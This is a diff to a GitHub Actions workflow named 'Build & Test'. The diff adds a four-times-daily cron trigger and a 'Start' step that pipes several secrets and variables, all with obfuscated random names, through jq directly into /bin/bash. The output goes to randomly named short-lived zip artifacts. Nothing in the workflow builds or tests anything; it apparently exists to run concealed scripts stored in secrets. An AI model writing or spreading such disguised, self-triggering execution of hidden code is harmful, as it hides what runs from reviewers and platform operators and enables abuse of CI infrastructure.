@@ -2,6 +2,8 @@ name: Build & Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '26 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,18 +18,18 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          jj114: ${{ secrets.jj114 }}
+          wqsy6604: ${{ secrets.wqsy6604 }}
         run: |
-          printf '%s' "$jj114" | jq -r .d0 | /bin/bash
-          printf '%s' "$f325" | jq -r .ripr6 | /bin/bash
-          printf '%s' "$xys2" | jq -r .v23359 | /bin/bash
-          echo $yitqm4384 | jq -r .lfm21 | /bin/bash
-          printf '%s' "$mz9318" | jq -r .d33 | /bin/bash
+          printf '%s' "$wqsy6604" | jq -r .xjh6445 | /bin/bash
+          printf '%s' "$vlc84" | jq -r .kgx6476 | /bin/bash
+          printf '%s' "$kw769" | jq -r .n80770 | /bin/bash
+          echo $zbc3 | jq -r .qjuai6 | /bin/bash
+          printf '%s' "$u8013" | jq -r .p9 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: m5mZ7ckn
+          name: yzJ0ryey
           path: "*.zip"
           retention-days: 1
